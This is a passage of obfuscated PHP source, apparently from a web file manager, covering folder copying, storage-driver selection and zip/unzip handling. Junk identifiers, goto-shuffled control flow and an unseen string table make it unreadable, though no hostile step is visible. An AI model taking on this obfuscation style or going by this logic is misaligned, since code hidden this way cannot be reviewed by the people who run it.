$b¨¸Àë ö”; continue; } $b×‚©Ò² = strstr(trim($b¨¸Àë ö”, $e÷Ñ·È‚£â[18]), $e÷Ñ·È‚£â[18]) ? get_path_father($b¨¸Àë ö”) : $e÷Ñ·È‚£â[43]; $a¯ö‚İ×é[] = array($e÷Ñ·È‚£â[1004] => $C‚åòÄ“Å[$e÷Ñ·È‚£â[85]], $e÷Ñ·È‚£â[1005] => rtrim($B×¯È¥…¹‚, $e÷Ñ·È‚£â[18]) . $e÷Ñ·È‚£â[18] . $b×‚©Ò², $e÷Ñ·È‚£â[1006] => $C‚åòÄ“Å); } $f¶‡¥³ò•Ò = array($e÷Ñ·È‚£â[177] => $a¯ö‚İ×é, $e÷Ñ·È‚£â[86] => $eŸÜÆ”‘£µ); goto EÉà²ˆ÷§“; c¨ñæø¿¾: $bâ«é•µ¯ß = self::_listAll($eî¾¾Ù¹Õ¾); $C¡áµ³¾ùÄ = self::_listAll($B×¯È¥…¹‚); $a¯ö‚İ×é = array(); goto aÀ½Á£¿Ü´; EßªˆØé: $e÷Ñ·È‚£â =& $_SERVER[©]; if (!IO::exist($eî¾¾Ù¹Õ¾)) { return !1; } if (!IO::exist($B×¯È¥…¹‚)) { IO::mkdir($B×¯È¥…¹‚); } goto c¨ñæø¿¾; EÉà²ˆ÷§“: Hook::trigger($e÷Ñ·È‚£â[1007], $eî¾¾Ù¹Õ¾, $B×¯È¥…¹‚, $f¶‡¥³ò•Ò); foreach ($eŸÜÆ”‘£µ as $C‚åòÄ“Å) { IO::mkdir($C‚åòÄ“Å); } foreach ($a¯ö‚İ×é as $C‚åòÄ“Å) { IO::copy($C‚åòÄ“Å[$e÷Ñ·È‚£â[1004]], $C‚åòÄ“Å[$e÷Ñ·È‚£â[1005]], REPEAT_REPLACE); } goto cÜâÅ¬öï›; cÜâÅ¬öï›: } private static function _listAll($aÄÚèíÑ ø) { $E÷¹Æ¿‡º‡ =& $_SERVER[©]; $aÄÚèíÑ ø = KodIO::clear($aÄÚèíÑ ø); $eÍ±ÂÀ¸Ì‡ = IO::listAll($aÄÚèíÑ ø); foreach ($eÍ±ÂÀ¸Ì‡ as &$fñ¨áçÇœŞ) { $fäˆçÌ“Ş¥ = substr($fñ¨áçÇœŞ[$E÷¹Æ¿‡º‡[85]], strlen($aÄÚèíÑ ø)); $fñ¨áçÇœŞ[$E÷¹Æ¿‡º‡[1008]] = trim($fäˆçÌ“Ş¥, $E÷¹Æ¿‡º‡[18]); } return array_to_keyvalue($eÍ±ÂÀ¸Ì‡, $E÷¹Æ¿‡º‡[1008]); } public static function fileSubstr($a×Ó„­¯ù, $Cã·ËÙİŸ, $dçò˜ŒÇ‚• = false) { goto bµâººÚˆˆ; C†¬óîèŒ: if ($Cã·ËÙİŸ + $dçò˜ŒÇ‚• > $cª×À¬Ÿ”) { $dçò˜ŒÇ‚• = $cª×À¬Ÿ” - $Cã·ËÙİŸ; } if ($dçò˜ŒÇ‚• <= 0) { return $_SERVER[©][43]; } if ($Cã·ËÙİŸ < 0 || $Cã·ËÙİŸ >= $cª×À¬Ÿ” || $dçò˜ŒÇ‚• > 1024 * 1024 * 5) { throw new Exception("\146\151\x6c\x65\122\x65\141\x64\40\145\x72\x72\157\162\41\x20\163\164\x61\162\x74\x3d{$Cã·ËÙİŸ}\73\154\x65\156\x67\164\150\75{$dçò˜ŒÇ‚•}\73\x20\x73\x69\x7a\145\x3d{$cª×À¬Ÿ”}\73"); } goto eİ…¬ÍÕ‡Ğ; D„ÃøÂñäö: $dÌêÔäÌ·© = $dçò˜ŒÇ‚•; if ($Cã·ËÙİŸ < 0) { $Cã·ËÙİŸ = $cª×À¬Ÿ” + $Cã·ËÙİŸ; } if ($dçò˜ŒÇ‚• === !1) { $dçò˜ŒÇ‚• = $cª×À¬Ÿ” - $Cã·ËÙİŸ; } goto C†¬óîèŒ; bµâººÚˆˆ: $f†Ö½ˆ˜óà = self::driverMake($a×Ó„­¯ù); $cª×À¬Ÿ” = $f†Ö½ˆ˜óà->size($a×Ó„­¯ù); $F¹…èëê¿ˆ = $Cã·ËÙİŸ; goto D„ÃøÂñäö; eİ…¬ÍÕ‡Ğ: return $f†Ö½ˆ˜óà->fileSubstr($a×Ó„­¯ù, $Cã·ËÙİŸ, $dçò˜ŒÇ‚•); goto FÅ„ÄÁ—º˜; FÅ„ÄÁ—º˜: } private static function driverMake(&$bËé–â†‰) { goto F¿¥İ¦ÀŸã; F¿¥İ¦ÀŸã: $E˜èÄ‹¯» =& $_SERVER[©]; $eÔ”èóâí  = KodIO::parse($bËé–â†‰); if (!self::$driverListSystem) { $Aˆ¡çëÅŸ = Model($E˜èÄ‹¯»[703])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($Aˆ¡çëÅŸ, $E˜èÄ‹¯»[375]); } goto E¾ïĞ®¶Ç¨; e÷ØÍÉÍÜ: return $f—ê­ë™ÌĞ; goto b”İ¿—¥ˆ; E¾ïĞ®¶Ç¨: if ($eÔ”èóâí [$E˜èÄ‹¯»[39]] == KodIO::KOD_IO && !self::$driverListSystem[$eÔ”èóâí [$E˜èÄ‹¯»[375]]]) { return !1; } $bËé–â†‰ = $eÔ”èóâí [$E˜èÄ‹¯»[1009]]; $f—ê­ë™ÌĞ = self::driverGet($eÔ”èóâí , $bËé–â†‰); goto e÷ØÍÉÍÜ; b”İ¿—¥ˆ: } private static function driverGet($D©ç¬ïÒ›ø, &$aç‚§âòİÃ) { goto aÔ£Ã˜Š¾Á; e–é•„ï¾: $BÑÊÌã¬åŒ = self::$driverCache[$A¿¶ š½æ×]; $BÑÊÌã¬åŒ->pathDriver = $B’‚İ†¼öó; $BÑÊÌã¬åŒ->pathBase = $A­ŒŞƒìõ„[43]; goto a»ñ­‚…½‡; a»ñ­‚…½‡: if (isset($E”ËŒ¸¿®Æ[$A­ŒŞƒìõ„[16]][$A­ŒŞƒìõ„[1021]])) { $BÑÊÌã¬åŒ->pathBase = rtrim($E”ËŒ¸¿®Æ[$A­ŒŞƒìõ„[16]][$A­ŒŞƒìõ„[1021]], $A­ŒŞƒìõ„[18]) . $A­ŒŞƒìõ„[18]; $aç‚§âòİÃ = $BÑÊÌã¬åŒ->pathBase . ltrim($aç‚§âòİÃ, $A­ŒŞƒìõ„[18]); } $aç‚§âòİÃ = $BÑÊÌã¬åŒ->getPath($aç‚§âòİÃ); if (isset($D©ç¬ïÒ›ø[$A­ŒŞƒìõ„[995]])) { $aç‚§âòİÃ = $D©ç¬ïÒ›ø[$A­ŒŞƒìõ„[995]]; } goto fØ¼Üò§´’; a—Êïëµµ: switch ($D©ç¬ïÒ›ø[$A­ŒŞƒìõ„[39]]) { case KodIO::KOD_IO: $E”ËŒ¸¿®Æ = self::$driverListSystem[$E¨Ü§Î…±’]; break; case KodIO::KOD_SOURCE: $aç‚§âòİÃ = $E¨Ü§Î…±’ . $aç‚§âòİÃ; $E”ËŒ¸¿®Æ = array($A­ŒŞƒìõ„[1011] => $A­ŒŞƒìõ„[1012], $A­ŒŞƒìõ„[16] => $D©ç¬ïÒ›ø); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $FÄäŠ‡¢£Ø = $GLOBALS[$A­ŒŞƒìõ„[1013]]; self::$driverListUser = array_to_keyvalue($FÄäŠ‡¢£Ø, $A­ŒŞƒìõ„[375]); } $E”ËŒ¸¿®Æ = self::$driverListUser[$E¨Ü§Î…±’]; break; case KodIO::KOD_SHARE_LINK: $E”ËŒ¸¿®Æ = array($A­ŒŞƒìõ„[1011] => $A­ŒŞƒìõ„[1014], $A­ŒŞƒìõ„[16] => $D©ç¬ïÒ›ø); $E¡ŞçŠéÂê = Action($A­ŒŞƒìõ„[1015])->sharePathInfo($D©ç¬ïÒ›ø[$A­ŒŞƒìõ„[85]]); $aç‚§âòİÃ = $E¡ŞçŠéÂê[$A­ŒŞƒìõ„[377]]; if (!$E¡ŞçŠéÂê[$A­ŒŞƒìõ„[377]]) { $eĞ¦ˆÄ¸–Å = Model($A­ŒŞƒìõ„[544])->getInfo($E¡ŞçŠéÂê[$A­ŒŞƒìõ„[449]]); $aç‚§âòİÃ = KodIO::clear($eĞ¦ˆÄ¸–Å[$A­ŒŞƒìõ„[1016]] . $D©ç¬ïÒ›ø[$A­ŒŞƒìõ„[1009]]); $D©ç¬ïÒ›ø[$A­ŒŞƒìõ„[447]] = $eĞ¦ˆÄ¸–Å; $D©ç¬ïÒ›ø[$A­ŒŞƒìõ„[995]] = $aç‚§âòİÃ; $E”ËŒ¸¿®Æ = array($A­ŒŞƒìõ„[1011] => $A­ŒŞƒìõ„[1017], $A­ŒŞƒìõ„[16] => $D©ç¬ïÒ›ø); } break; case KodIO::KOD_SHARE_ITEM: $E”ËŒ¸¿®Æ = array($A­ŒŞƒìõ„[1011] => $A­ŒŞƒìõ„[1018], $A­ŒŞƒìõ„[16] => $D©ç¬ïÒ›ø); $eĞ¦ˆÄ¸–Å = Model($A­ŒŞƒìõ„[544])->getInfo($D©ç¬ïÒ›ø[$A­ŒŞƒìõ„[375]]); if ($eĞ¦ˆÄ¸–Å[$A­ŒŞƒìõ„[377]] == $A­ŒŞƒìõ„[476]) { $aç‚§âòİÃ = KodIO::clear($eĞ¦ˆÄ¸–Å[$A­ŒŞƒìõ„[1016]] . $D©ç¬ïÒ›ø[$A­ŒŞƒìõ„[1009]]); $D©ç¬ïÒ›ø[$A­ŒŞƒìõ„[447]] = $eĞ¦ˆÄ¸–Å; $D©ç¬ïÒ›ø[$A­ŒŞƒìõ„[995]] = $aç‚§âòİÃ; $E”ËŒ¸¿®Æ = array($A­ŒŞƒìõ„[1011] => $A­ŒŞƒìõ„[1019], $A­ŒŞƒìõ„[16] => $D©ç¬ïÒ›ø); } else { if (!$aç‚§âòİÃ) { $aç‚§âòİÃ = $eĞ¦ˆÄ¸–Å[$A­ŒŞƒìõ„[377]]; } } break; default: $aç‚§âòİÃ = $D©ç¬ïÒ›ø[$A­ŒŞƒìõ„[85]]; $E”ËŒ¸¿®Æ = array($A­ŒŞƒìõ„[1011] => $A­ŒŞƒìõ„[1020]); break; } $A¿¶ š½æ× = $D©ç¬ïÒ›ø[$A­ŒŞƒìõ„[85]]; if (!isset(self::$driverCache[$A¿¶ š½æ×])) { $CÓšÇ§“âó = strtolower($E”ËŒ¸¿®Æ[$A­ŒŞƒìõ„[100]]); $f¾šÎ¿…İµ = $GLOBALS[$A­ŒŞƒìõ„[16]][$A­ŒŞƒìõ„[94]][$A­ŒŞƒìõ„[753]]; $C„°ÕŸÄôƒ = $A­ŒŞƒìõ„[81] . (isset($f¾šÎ¿…İµ[$CÓšÇ§“âó]) ? $f¾šÎ¿…İµ[$CÓšÇ§“âó] : ucfirst($CÓšÇ§“âó)); if (!class_exists($C„°ÕŸÄôƒ)) { show_json("{$C„°ÕŸÄôƒ}\40\156\x6f\164\x20\x65\170\151\163\x74\163\x21", !1); } $a¾„ÉÂ¸® = isset($E”ËŒ¸¿®Æ[$A­ŒŞƒìõ„[16]]) ? $E”ËŒ¸¿®Æ[$A­ŒŞƒìõ„[16]] : !1; self::$driverCache[$A¿¶ š½æ×] = new $C„°ÕŸÄôƒ($a¾„ÉÂ¸®); } goto e–é•„ï¾; fØ¼Üò§´’: $BÑÊÌã¬åŒ->path = $aç‚§âòİÃ; return $BÑÊÌã¬åŒ; goto AŞ‘à¡­¹; aÔ£Ã˜Š¾Á: $A­ŒŞƒìõ„ =& $_SERVER[©]; $B’‚İ†¼öó = $D©ç¬ïÒ›ø[$A­ŒŞƒìõ„[1010]]; $E¨Ü§Î…±’ = $D©ç¬ïÒ›ø[$A­ŒŞƒìõ„[375]]; goto a—Êïëµµ; AŞ‘à¡­¹: } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $EÏ›¦­›ˆ; if (!$EÏ›¦­›ˆ) { $bÉ×°‹¼Çİ = IO::init($_SERVER[©][18]); } return $bÉ×°‹¼Çİ; } private static function iconvSystem($eóÑ¦àÈÄ) { return self::local()->iconvSystem($eóÑ¦àÈÄ); } private static function iconvApp($d«ËŒÓà·¹) { return self::local()->iconvApp($d«ËŒÓà·¹); } public static function zip($a¬ö‰¨Î¬, $dÔ×°—šØ = "\172\151\160", $AÅ»¥êÅŠÊ = '', $CïÈÙ˜´È¶ = REPEAT_RENAME) { goto b…¦´ó©„Ş; AÆÊ·‹¹‹º: $DÓ„±ïŠ’£ = $d¶«ôÊõÉÊ . $f É¾‹™ºõ . $Dò´¢‹®¬¼[101] . $dÔ×°—šØ; $DÓ„±ïŠ’£ = get_filename_auto($DÓ„±ïŠ’£, $Dò´¢‹®¬¼[43], $CïÈÙ˜´È¶); $CÆ»®‚ßòø = self::iconvSystem($DÓ„±ïŠ’£); goto c­¥“¦ÎªÍ; fµõ„Ì…ë: if (!$F’¢É¢”´Ÿ) { del_dir($F÷•Øİ„Æ); show_json(LNG($Dò´¢‹®¬¼[1024]), !1); } del_dir($F÷•Øİ„Æ); return $F’¢É¢”´Ÿ; goto dš‚˜ë•ø¨; c—¾Ëö¬ï: if (count($DÀ¶Ç”¨Ñ) > 1) { $bñÆÖ¿££™ = IO::info(IO::pathFather($dîøØñ†«£[$Dò´¢‹®¬¼[85]])); $f É¾‹™ºõ = $bñÆÖ¿££™[$Dò´¢‹®¬¼[38]]; } $d¶«ôÊõÉÊ = $F÷•Øİ„Æ; if (!$d¶«ôÊõÉÊ) { $d¶«ôÊõÉÊ = get_path_father($dîøØñ†«£[$Dò´¢‹®¬¼[85]]); $d™¨ÂîÓ = IO::info($d¶«ôÊõÉÊ); if (!$d™¨ÂîÓ[$Dò´¢‹®¬¼[199]]) { show_json(LNG($Dò´¢‹®¬¼[1023]), !1); } } goto AÆÊ·‹¹‹º; c­¥“¦ÎªÍ: foreach ($DÀ¶Ç”¨Ñ as $eã¶áŠÑ«í => $cĞèóÁ¹í) { $DÀ¶Ç”¨Ñ[$eã¶áŠÑ«í] = self::iconvSystem($cĞèóÁ¹í); } KodArchive::create($CÆ»®‚ßòø, $DÀ¶Ç”¨Ñ); if (!IO::exist($DÓ„±ïŠ’£)) { if ($F÷•Øİ„Æ) { del_dir($F÷•Øİ„Æ); } show_json(LNG($Dò´¢‹®¬¼[1024]), !1); } goto dùİÑ´ éÎ; dùİÑ´ éÎ: if ($AÅ»¥êÅŠÊ || !$F÷•Øİ„Æ) { if ($F÷•Øİ„Æ && strstr($F÷•Øİ„Æ, TEMP_FILES)) { $DŞ›“…Ö•‰ = $DÀ¶Ç”¨Ñ = array(); recursion_dir($d¶«ôÊõÉÊ, $DŞ›“…Ö•‰, $DÀ¶Ç”¨Ñ, 0); foreach ($DŞ›“…Ö•‰ as $b©Èæ¦‘ù) { del_dir($b©Èæ¦‘ù); } foreach ($DÀ¶Ç”¨Ñ as $F¡ŸºÄå¬Õ) { if ($F¡ŸºÄå¬Õ == $CÆ»®‚ßòø) { continue; } del_file($F¡ŸºÄå¬Õ); } } return $DÓ„±ïŠ’£; } $b‰šƒ¶ñÛ = self::pathFather($dîøØñ†«£[$Dò´¢‹®¬¼[85]]); $F’¢É¢”´Ÿ = self::move($DÓ„±ïŠ’£, $b‰šƒ¶ñÛ, $CïÈÙ˜´È¶); goto fµõ„Ì…ë; b…¦´ó©„Ş: $Dò´¢‹®¬¼ =& $_SERVER[©]; $E÷‚«“¨» = self::init($a¬ö‰¨Î¬[0][$Dò´¢‹®¬¼[85]]); $dîøØñ†«£ = self::info($a¬ö‰¨Î¬[0][$Dò´¢‹®¬¼[85]]); goto c‚éŠÙÕºÀ; c‚éŠÙÕºÀ: $F÷•Øİ„Æ = !1; if (!$AÅ»¥êÅŠÊ && $E÷‚«“¨»->getType() == $Dò´¢‹®¬¼[112]) { $DÀ¶Ç”¨Ñ = self::zipFileList($a¬ö‰¨Î¬); } else { $F÷•Øİ„Æ = $AÅ»¥êÅŠÊ ? $AÅ»¥êÅŠÊ : TEMP_FILES . $Dò´¢‹®¬¼[1022] . time() . rand_string(8) . $Dò´¢‹®¬¼[18]; mk_dir($F÷•Øİ„Æ); $DÀ¶Ç”¨Ñ = self::zipFileList($a¬ö‰¨Î¬, $F÷•Øİ„Æ); } $f É¾‹™ºõ = $dîøØñ†«£[$Dò´¢‹®¬¼[38]]; goto c—¾Ëö¬ï; dš‚˜ë•ø¨: } public static function unzip($C†¹Å Ä«, $fÛ“‹œã¸ = "\162\x65\160\154\x61\x63\x65") { goto D‡–Í„¥Ø¯; BŠì«ƒ¡‹¾: mk_dir($DÛÒš‰¥î±); $A¶­…ÖÒ—… = self::fileExt($a²ÍæÚò‹‘); $eàíÖãé¦ = $DÛÒš‰¥î± . $bÔ§Ôâ£‚[101] . $A¶­…ÖÒ—…; goto B¤Ü‡ÖáÒ; fÊÈØíÈ¼…: if (!($a²ÍæÚò‹‘ = parent::info($C‹•Ó×ğ‚))) { show_json(LNG($bÔ§Ôâ£‚[1026]), !1); } if (!($Eš®ù¦‹ÛÎ = parent::infoFull($eÀ•ÖØâŸÆ))) { $eÀ•ÖØâŸÆ = parent::mkdir($eÀ•ÖØâŸÆ); $Eš®ù¦‹ÛÎ = array($bÔ§Ôâ£‚[85] => $eÀ•ÖØâŸÆ); } else { if (isset($Eš®ù¦‹ÛÎ[$bÔ§Ôâ£‚[377]]) && trim($Eš®ù¦‹ÛÎ[$bÔ§Ôâ£‚[85]], $bÔ§Ôâ£‚[18]) != trim($eÀ•ÖØâŸÆ, $bÔ§Ôâ£‚[18])) { $dé„‘Ò±¿ = KodIO::make($Eš®ù¦‹ÛÎ[$bÔ§Ôâ£‚[469]]); $A¨²¸ÇÉ‰— = parent::fileNameAuto($dé„‘Ò±¿, $Eš®ù¦‹ÛÎ[$bÔ§Ôâ£‚[38]], REPEAT_RENAME_FOLDER, !0); $eÀ•ÖØâŸÆ = parent::mkdir($dé„‘Ò±¿ . $A¨²¸ÇÉ‰—); $Eš®ù¦‹ÛÎ = array($bÔ§Ôâ£‚[85] => $eÀ•ÖØâŸÆ); } } $eÀ•ÖØâŸÆ = $Eš®ù¦‹ÛÎ[$bÔ§Ôâ£‚[85]]; goto EÊš®ëö’; B¤Ü‡ÖáÒ: if (!@file_exists(self::iconvSystem($eàíÖãé¦))) { $DœïêçÛŞñ = self::localFilePath($C‹•Ó×ğ‚, $A¶­…ÖÒ—…); $eàíÖãé¦ = $DœïêçÛŞñ ? $DœïêçÛŞñ : parent::download($C‹•Ó×ğ‚, $eàíÖãé¦); } $eàíÖãé¦ = self::iconvSystem($eàíÖãé¦); $eŒÆ·¢¥” = isset($C†¹Å Ä«[$bÔ§Ôâ£‚[1027]]) ? $C†¹Å Ä«[$bÔ§Ôâ£‚[1027]] : $bÔ§Ôâ£‚[1028]; goto b­Ò¶¤ì¶ø; A÷‹Ğ¦Ê§é: return !0; goto AÁ´¯¨®¼ï; b­Ò¶¤ì¶ø: $eÃ¨†Ëß = KodArchive::extract($eàíÖãé¦, $DÛÒš‰¥î± . $bÔ§Ôâ£‚[18], $eŒÆ·¢¥”); self::archiveExt(); if (!$eÃ¨†Ëß[$bÔ§Ôâ£‚[1029]]) { show_json($bÔ§Ôâ£‚[1030] . $eÃ¨†Ëß[$bÔ§Ôâ£‚[1031]], !1); } goto D´°ßå¿‰; BÉŸÁ‡öùÇ: foreach ($d»ÈÇÙãæ­ as $A½½©æÜÔ) { $A½½©æÜÔ = self::iconvApp($A½½©æÜÔ); self::move($A½½©æÜÔ, $eÀ•ÖØâŸÆ, $fÛ“‹œã¸); } del_dir($DÛÒš‰¥î±); if (!$DœïêçÛŞñ) { del_file($eàíÖãé¦); } goto A÷‹Ğ¦Ê§é; EÊš®ëö’: $f¶ÏÉ‘‡Ã = self::tmpFileName($a²ÍæÚò‹‘); $DÛÒš‰¥î± = TEMP_FILES . $f¶ÏÉ‘‡Ã; del_dir($DÛÒš‰¥î±); goto BŠì«ƒ¡‹¾; D‡–Í„¥Ø¯: $bÔ§Ôâ£‚ =& $_SERVER[©]; $C‹•Ó×ğ‚ = $C†¹Å Ä«[$bÔ§Ôâ£‚[85]]; $eÀ•ÖØâŸÆ = $C†¹Å Ä«[$bÔ§Ôâ£‚[1025]]; goto fÊÈØíÈ¼…; D´°ßå¿‰: Hook::trigger($bÔ§Ôâ£‚[1032], $DÛÒš‰¥î±); recursion_dir($DÛÒš‰¥î±, $dÏ­Í‰šÜ, $A¤³ñô£Ø, 0); $d»ÈÇÙãæ­ = array_merge($dÏ­Í‰šÜ, $A¤³ñô£Ø); goto BÉŸÁ‡öùÇ; AÁ´¯¨®¼ï: } public static function unzipList($B÷ŞËè³ÁĞ) { goto e˜‡‡ÅåÜ; A•ëÍ¿Ó©: $fƒ—Œ‡±† = self::iconvSystem($fƒ—Œ‡±†); if ($Bì²”’Úâ >= 0) { $D¿ª²ö’Õ¼ = isset($B÷ŞËè³ÁĞ[$C–¾…×¼£â[1037]]) ? $B÷ŞËè³ÁĞ[$C–¾…×¼£â[1037]] : !1; $D†öØê—–À = isset($B÷ŞËè³ÁĞ[$C–¾…×¼£â[38]]) ? $B÷ŞËè³ÁĞ[$C–¾…×¼£â[38]] : $C–¾…×¼£â[43]; KodArchive::filePreview($fƒ—Œ‡±†, $Bì²”’Úâ, $D¿ª²ö’Õ¼, $D†öØê—–À); self::archiveExt(); die; } $EàòµùÓÏ = KodArchive::listContent($fƒ—Œ‡±†); goto eó¯ñæÙº¼; eó¯ñæÙº¼: self::archiveExt(); del_dir($C‰ÛÛ¢ß¿); if (!$EàòµùÓÏ[$C–¾…×¼£â[1029]]) { show_json($EàòµùÓÏ[$C–¾…×¼£â[1031]], !1); } goto bÃÑ•ÊÁ®´; CŞÅ¶åË‡„: return $EàòµùÓÏ[$C–¾…×¼£â[1031]]; goto CºŒ ™”©Ô; B›¢„™×Ä«: $fªå¾ğ½œØ = 50000; if (request_url_safe($E’…Í¶ñÊº)) { $Eó¾„ˆõñ‰ = parse_url_query($E’…Í¶ñÊº); if (!isset($Eó¾„ˆõñ‰[$C–¾…×¼£â[85]])) { show_json($C–¾…×¼£â[1034], !1); } } $AÒÜ±Ü¹Ğì = isset($Eó¾„ˆõñ‰) ? $Eó¾„ˆõñ‰[$C–¾…×¼£â[85]] : $E’…Í¶ñÊº; goto a™Ã Ø; bÃÑ•ÊÁ®´: $A…›ÒÂ¥½ = json_encode($EàòµùÓÏ[$C–¾…×¼£â[1031]]); self::setContent($AŒªÏ‹À¬…, $A…›ÒÂ¥½); if (count($EàòµùÓÏ[$C–¾…×¼£â[1031]]) >= $fªå¾ğ½œØ) { show_json(sprintf(LNG($C–¾…×¼£â[1035]), count($EàòµùÓÏ[$C–¾…×¼£â[1031]])), !1); } goto CŞÅ¶åË‡„; e˜‡‡ÅåÜ: $C–¾…×¼£â =& $_SERVER[©]; $E’…Í¶ñÊº = $B÷ŞËè³ÁĞ[$C–¾…×¼£â[85]]; $Bì²”’Úâ = isset($B÷ŞËè³ÁĞ[$C–¾…×¼£â[1033]]) ? $B÷ŞËè³ÁĞ[$C–¾…×¼£â[1033]] : -1; goto B›¢„™×Ä«; bÊöïïÖé: if (isset($Eó¾„ˆõñ‰)) { $C§ëØœÁªó = array($Eó¾„ˆõñ‰[$C–¾…×¼£â[85]], $Eó¾„ˆõñ‰[$C–¾…×¼£â[1033]], $Eó¾„ˆõñ‰[$C–¾…×¼£â[38]]); $FğĞÂ¦Ÿõ‚ = md5(implode($C–¾…×¼£â[80], $C§ëØœÁªó)) . $C–¾…×¼£â[101] . get_path_ext($Eó¾„ˆõñ‰[$C–¾…×¼£â[38]]); } else { $C§ëØœÁªó = array($b¢ÎÆÈ²…Ç[$C–¾…×¼£â[38]], $b¢ÎÆÈ²…Ç[$C–¾…×¼£â[85]], $b¢ÎÆÈ²…Ç[$C–¾…×¼£â[87]]); $FğĞÂ¦Ÿõ‚ = md5(implode($C–¾…×¼£â[80], $C§ëØœÁªó)) . $C–¾…×¼£â[101] . $Eß›—º½Ğ; } if ($Bì²”’Úâ == -1) { $AŒªÏ‹À¬… = IO_PATH_SYSTEM_TEMP . "\172\151\x70\126\x69\x65\167\57{$e¶¥ÄµÄØÄ}\x2f{$FğĞÂ¦Ÿõ‚}\56\x6c\157\x67"; $bÒÆäÕÇ = self::infoFull($AŒªÏ‹À¬…); if ($bÒÆäÕÇ) { $AŒªÏ‹À¬… = $bÒÆäÕÇ[$C–¾…×¼£â[85]]; $BÊÑå­ê¯ = self::getContent($AŒªÏ‹À¬…); if ($BÊÑå­ê¯) { $A…›ÒÂ¥½ = json_decode($BÊÑå­ê¯, !0); if (count($A…›ÒÂ¥½) >= $fªå¾ğ½œØ) { show_json(sprintf(LNG($C–¾…×¼£â[1035]), count($A…›ÒÂ¥½)), !1); } return $A…›ÒÂ¥½; } } else { $AŒªÏ‹À¬… = self::mkfile($AŒªÏ‹À¬…); } } $C‰ÛÛ¢ß¿ = TEMP_FILES . $e¶¥ÄµÄØÄ; goto AÆ—·•¦³; a™Ã Ø: $b¢ÎÆÈ²…Ç = self::info($AÒÜ±Ü¹Ğì); $Eß›—º½Ğ = self::fileExt($b¢ÎÆÈ²…Ç); $e¶¥ÄµÄØÄ = self::tmpFileName($b¢ÎÆÈ²…Ç); goto bÊöïïÖé; AÆ—·•¦³: if (!is_dir($C‰ÛÛ¢ß¿)) { mk_dir($C‰ÛÛ¢ß¿); } $fƒ—Œ‡±† = $C‰ÛÛ¢ß¿ . $C–¾…×¼£â[18] . $FğĞÂ¦Ÿõ‚; if (!@file_exists(self::iconvSystem($fƒ—Œ‡±†))) { if (isset($Eó¾„ˆõñ‰)) { url_request($E’…Í¶ñÊº, $C–¾…×¼£â[1036], $fƒ—Œ‡±†); } else { $e‡Â¤ò¹‚¶ = self::localFilePath($E’…Í¶ñÊº, $Eß›—º½Ğ); $fƒ—Œ‡±† = $e‡Â¤ò¹‚¶ ? $e‡Â¤ò¹‚¶ : self::download($E’…Í¶ñÊº, $fƒ—Œ‡±†); } } goto A•ëÍ¿Ó©; CºŒ ™”©Ô: } private static function fileExt($D¿ŞÜŸÃÇˆ) { $Eã’ÄëáÀ§ =& $_SERVER[©]; $A¥Ó„ŠäÀ = $D¿ŞÜŸÃÇˆ[$Eã’ÄëáÀ§[170]]; if ($A¥Ó„ŠäÀ == $Eã’ÄëáÀ§[1038]) { $F…¼“¾©½© = $Eã’ÄëáÀ§[1039]; if (substr($D¿ŞÜŸÃÇˆ[$Eã’ÄëáÀ§[38]], -strlen($F…¼“¾©½©)) == $F…¼“¾©½©) { $A¥Ó„ŠäÀ = $Eã’ÄëáÀ§[1040]; } } self::archiveExt($A¥Ó„ŠäÀ); return $A¥Ó„ŠäÀ; } private static function zipFileList($EÉ¾¯‚² , $a”¸Í†âõ¶ = false) { $b¾òñáæ®… =& $_SERVER[©]; $dÄ¤ë™®Ë… = array(); foreach ($EÉ¾¯‚²  as $Eö‚Æ¨‚¥‚) { $b‰Î¼º•åÑ = $Eö‚Æ¨‚¥‚[$b¾òñáæ®…[85]]; if ($a”¸Í†âõ¶) { $b‰Î¼º•åÑ = self::copy($Eö‚Æ¨‚¥‚[$b¾òñáæ®…[85]], $a”¸Í†âõ¶, $b¾òñáæ®…[744]); } if ($b‰Î¼º•åÑ && self::local()->exist($b‰Î¼º•åÑ)) { $dÄ¤ë™®Ë…[$Eö‚Æ¨‚¥‚[$b¾òñáæ®…[85]]] = $b‰Î¼º•åÑ; } } if (!empty($dÄ¤ë™®Ë…)) { return array_values($dÄ¤ë™®Ë…); } show_json(LNG($b¾òñáæ®…[1041]), !1); } public static function tmpFileName($eÖ™”¹éì°) { $fÙâ¼²¯œ =& $_SERVER[©]; $e¿àÏ¹ÙËÆ = array($eÖ™”¹éì°[$fÙâ¼²¯œ[38]], $eÖ™”¹éì°[$fÙâ¼²¯œ[85]], $eÖ™”¹éì°[$fÙâ¼²¯œ[87]], $eÖ™”¹éì°[$fÙâ¼²¯œ[467]]); return md5(implode($fÙâ¼²¯œ[80], $e¿àÏ¹ÙËÆ)); } private static function localFilePath($FĞŠóÃŸ“Š, $eÖ¸©µêÄ) { goto cœããõÀÈ; AÔ’²ÅÙÊÂ: if ($FèÈ¬Ş¸‰ == $F½‡ˆ›ø±¬[112] || $FèÈ¬Ş¸‰ == $F½‡ˆ›ø±¬[1045]) { if (!$aÎö»•ºí->exist($aÎö»•ºí->path)) { show_json(LNG($F½‡ˆ›ø±¬[111]), !1); } return $aÎö»•ºí->path; } return !1; goto d¿‰¿Á¬ÌØ; cœããõÀÈ: $F½‡ˆ›ø±¬ =& $_SERVER[©]; if ($eÖ¸©µêÄ == $F½‡ˆ›ø±¬[1042] && strtoupper(substr(PHP_OS, 0, 3)) == $F½‡ˆ›ø±¬[1043]) { return !1; } $eÆ¨ö÷«Ëä = KodIO::parse($FĞŠóÃŸ“Š); goto D¶É½ááï¼; D¶É½ááï¼: if ($eÆ¨ö÷«Ëä[$F½‡ˆ›ø±¬[39]] == KodIO::KOD_SOURCE) { $b¥âÙƒÇ¯† = Model($F½‡ˆ›ø±¬[752])->fileInfoGet(KodIO::sourceID($FĞŠóÃŸ“Š)); if (!$b¥âÙƒÇ¯†[$F½‡ˆ›ø±¬[85]]) { show_json($F½‡ˆ›ø±¬[1044], !1); } $FĞŠóÃŸ“Š = $b¥âÙƒÇ¯†[$F½‡ˆ›ø±¬[85]]; } $aÎö»•ºí = self::init($FĞŠóÃŸ“Š); $FèÈ¬Ş¸‰ = $aÎö»•ºí->getType(); goto AÔ’²ÅÙÊÂ; d¿‰¿Á¬ÌØ: } private static function archiveExt($cÂÇ­›Ö = '') { $GLOBALS[$_SERVER[©][1046]] = $cÂÇ­›Ö; } } goto cÖáíîĞ•; cƒØ›ó…: class ZipMake { const VERSION = 